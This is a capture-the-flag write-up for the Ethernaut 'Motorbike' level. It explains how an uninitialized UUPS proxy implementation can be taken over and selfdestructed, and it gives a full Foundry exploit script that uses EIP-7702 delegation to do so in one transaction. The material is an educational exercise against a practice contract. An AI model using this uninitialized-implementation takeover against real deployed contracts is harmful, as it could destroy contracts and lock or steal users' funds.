---
title: "Ethernaut 25 Motorbike"
description: "Ethernaut 25 Motorbike writeup"
---

## Challenge
### Prompt
Ethernaut's motorbike has a brand new upgradeable engine design.
Would you be able to `selfdestruct` its engine and make the motorbike unusable ?
Things that might help:
- [EIP-1967](https://eips.ethereum.org/EIPS/eip-1967)
- [UUPS](https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786) upgradeable pattern
- [Initializable](https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/core/contracts/Initializable.sol) contract
### Code
```solidity
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "openzeppelin-contracts-06/utils/Address.sol";
import "openzeppelin-contracts-06/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    struct AddressSlot {
        address value;
    }

    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(abi.encodeWithSignature("initialize()"));
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`.
    // Will run if no other function in the contract matches the call data
    fallback() external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(address newImplementation, bytes memory data) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }

    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");

        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```
## Background

---

Like a typical proxy, `Motorbike` holds no logic of its own. It forwards every call to the address stored in the EIP-1967 implementation slot.
```solidity
bytes32 internal constant _IMPLEMENTATION_SLOT =
    0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
```
The slot is defined as `keccak256("eip1967.proxy.implementation") - 1`. The proxy's fallback reads the implementation address from this slot and `delegatecall`s it. So the user calls the `Motorbike` address, but the actual code runs in `Engine`.

---

This challenge shows a simplified version of the UUPS-style upgrade flow. The upgrade function lives inside the implementation `Engine`, not the proxy.
```solidity
function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
    _authorizeUpgrade();
    _upgradeToAndCall(newImplementation, data);
}
```
In UUPS the implementation contract itself is a standalone contract. Calling through the proxy changes the proxy's storage, but calling the implementation address directly changes the implementation's own storage.

---

`Engine.initialize()` uses the `initializer` modifier.
```solidity
function initialize() external initializer {
    horsePower = 1000;
    upgrader = msg.sender;
}
```
The proxy constructor initializes with `_logic.delegatecall(abi.encodeWithSignature("initialize()"))`. Because this is a `delegatecall`, the initialized state and `upgrader` are recorded in the proxy's storage. The `Engine` implementation contract's own storage stays uninitialized.
If you find the implementation address directly and call `Engine.initialize()`, you can set the implementation contract's `upgrader` to your own address.

---

The original intent of this challenge was to `selfdestruct` the `Engine` implementation so that the proxy no longer works. But after Cancun/Dencun, EIP-6780 changed the meaning of `selfdestruct`.
Under the current rules, `selfdestruct` removes code and storage only when it is executed on a contract created within the same transaction. If you run it on a contract that already existed from an earlier transaction, it only transfers the balance and does not delete the code.
So the old approach of first clicking `Get new instance` on the site and later running `selfdestruct` on `Engine` in a separate transaction no longer passes on the current Sepolia.

---

EIP-7702 lets an EOA behave like contract code during a specific transaction. In Foundry you can attach an authorization list with `vm.signAndAttachDelegation()`.
The challenge requires running `Ethernaut.createLevelInstance()` and `Engine.selfdestruct` within the same transaction. If a plain contract makes the calls instead, Ethernaut records that contract as the player, so it will not be linked to the site account's completion mark. So I use EIP-7702 to let my EOA execute code directly and handle instance creation and the exploit in one transaction from my EOA address.
## Analyzing the challenge code

---

First, the proxy structure of `Motorbike`:
```solidity
fallback() external payable virtual {
    _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
}
```
`Motorbike` has no user functions. When call data comes in, it `delegatecall`s directly to the `Engine` address stored in the implementation slot. So when you use `Motorbike` like a normal contract, the `Engine` code actually runs on top of the proxy's storage.

---

Next, the part that lets us initialize the `Engine` implementation directly:
```solidity
function initialize() external initializer {
    horsePower = 1000;
    upgrader = msg.sender;
}
```
It looks like `initialize()` was already called in the proxy constructor, but that call was a `delegatecall`. Only the proxy's storage was initialized. The implementation contract's own `Initializable` storage is still empty.
Because of this difference, you can call the `Engine` address directly and run `initialize()` again. That makes the implementation contract's `upgrader` your own address.

---

Then the `delegatecall` flow in `upgradeToAndCall`:
```solidity
function _upgradeToAndCall(address newImplementation, bytes memory data) internal {
    _setImplementation(newImplementation);
    if (data.length > 0) {
        (bool success,) = newImplementation.delegatecall(data);
        require(success, "Call failed");
    }
}
```
`upgradeToAndCall()` stores `newImplementation` in the implementation slot, then executes the received `data` with `newImplementation.delegatecall(data)`.
If this function runs while the implementation contract was called directly, the delegatecall's context is the `Engine` implementation itself. So if `newImplementation` has a `selfdestruct` function and you delegatecall that function, the destruction target is not `newImplementation` but `Engine`, the calling context.

---

Ethernaut's current `MotorbikeFactory` checks whether the code at the instance's engine address is gone.
```solidity
function validateInstance(address payable _instance, address _player) public override returns (bool) {
    _player;
    Engine engine = Engine(engines[_instance]);
    return !Address.isContract(address(engine));
}
```
So the target is not the `Motorbike` proxy itself. The goal is to bring the code size of the `Engine` implementation stored in `engines[_instance]` to 0.
Since EIP-6780, this condition only holds if `Engine` is `selfdestruct`ed within the same transaction that created it, so the solution starts by calling `createLevelInstance()` directly.
## Solution
The old solution was to find the implementation address, initialize the implementation directly, and then `selfdestruct` `Engine` via the delegatecall in `upgradeToAndCall()`.
On the current Sepolia one more condition applies: `Engine` creation and the `selfdestruct` execution must be in the same transaction. If you create the instance beforehand in the site UI, the `Engine` creation transaction ends at that moment, so it fails.
So I use EIP-7702 to have my EOA do the following in a single transaction.
1. Call `Ethernaut.createLevelInstance(MOTORBIKE_LEVEL)`
2. Compute the `Engine` address and `Motorbike` address that `MotorbikeFactory` will create
3. Call `Engine.initialize()` directly on the just-created engine
4. Call `Engine.upgradeToAndCall(bomb, abi.encodeWithSelector(MotorbikeBomb.explode.selector))`
5. Call `Ethernaut.submitLevelInstance(motorbike)` in the next transaction

`MotorbikeFactory` internally creates the `Engine` first, then the `Motorbike`. So the next addresses follow from the factory's current nonce with the RLP method.
- `engine = computeCreateAddress(motorbikeLevel, factoryNonce)`
- `motorbike = computeCreateAddress(motorbikeLevel, factoryNonce + 1)`

The instance created this way is recorded in `Ethernaut` as my EOA's instance. Calling `submitLevelInstance()` from the same EOA then records the site's completion mark.
### Exploit
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Script.sol";

interface IEthernaut {
    function createLevelInstance(address level) external payable;
    function submitLevelInstance(address payable instance) external;
}

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract MotorbikeBomb {
    function explode() external {
        selfdestruct(payable(msg.sender));
    }
}

contract Sol25Delegation {
    address private immutable owner;

    constructor(address owner_) {
        owner = owner_;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "only owner");
        _;
    }

    function solve(address ethernaut, address motorbikeLevel, uint256 factoryNonce, address bomb)
        external
        onlyOwner
        returns (address motorbike)
    {
        IEthernaut(ethernaut).createLevelInstance(motorbikeLevel);

        address engine = computeCreateAddress(motorbikeLevel, factoryNonce);
        motorbike = computeCreateAddress(motorbikeLevel, factoryNonce + 1);

        IEngine(engine).initialize();
        IEngine(engine).upgradeToAndCall(bomb, abi.encodeWithSelector(MotorbikeBomb.explode.selector));
    }

    function computeCreateAddress(address deployer, uint256 nonce) public pure returns (address) {
        if (nonce == 0) {
            return
                address(
                    uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, bytes1(0x80)))))
                );
        }
        if (nonce <= 0x7f) {
            // forge-lint: disable-next-line(unsafe-typecast)
            uint8 nonce8 = uint8(nonce);
            return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, nonce8)))));
        }
        if (nonce <= type(uint8).max) {
            // forge-lint: disable-next-line(unsafe-typecast)
            uint8 nonce8 = uint8(nonce);
            return address(
                uint160(
                    uint256(keccak256(abi.encodePacked(bytes1(0xd7), bytes1(0x94), deployer, bytes1(0x81), nonce8)))
                )
            );
        }
        if (nonce <= type(uint16).max) {
            // forge-lint: disable-next-line(unsafe-typecast)
            uint16 nonce16 = uint16(nonce);
            return address(
                uint160(
                    uint256(keccak256(abi.encodePacked(bytes1(0xd8), bytes1(0x94), deployer, bytes1(0x82), nonce16)))
                )
            );
        }
        if (nonce <= type(uint24).max) {
            // forge-lint: disable-next-line(unsafe-typecast)
            uint24 nonce24 = uint24(nonce);
            return address(
                uint160(
                    uint256(keccak256(abi.encodePacked(bytes1(0xd9), bytes1(0x94), deployer, bytes1(0x83), nonce24)))
                )
            );
        }

        // forge-lint: disable-next-line(unsafe-typecast)
        uint32 nonce32 = uint32(nonce);
        return address(
            uint160(uint256(keccak256(abi.encodePacked(bytes1(0xda), bytes1(0x94), deployer, bytes1(0x84), nonce32))))
        );
    }
}

contract Sol25 is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address player = vm.addr(privateKey);
        IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_INSTANCE"));
        address motorbikeLevel = vm.envAddress("MOTORBIKE_LEVEL");
        uint256 factoryNonce = vm.envOr("MOTORBIKE_FACTORY_NONCE", uint256(vm.getNonce(motorbikeLevel)));

        vm.broadcast(privateKey);
        Sol25Delegation implementation = new Sol25Delegation(player);

        vm.broadcast(privateKey);
        MotorbikeBomb bomb = new MotorbikeBomb();

        vm.broadcast(privateKey);
        vm.signAndAttachDelegation(address(implementation), privateKey);
        address motorbike =
            Sol25Delegation(payable(player)).solve(address(ethernaut), motorbikeLevel, factoryNonce, address(bomb));

        vm.broadcast(privateKey);
        ethernaut.submitLevelInstance(payable(motorbike));
    }
}

contract Sol25Clear is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.signAndAttachDelegation(address(0), privateKey);
        vm.broadcast(privateKey);
        (bool success,) = payable(vm.addr(privateKey)).call("");
        require(success, "clear delegation failed");
    }
}
```
![screenshot](./image-1.png)
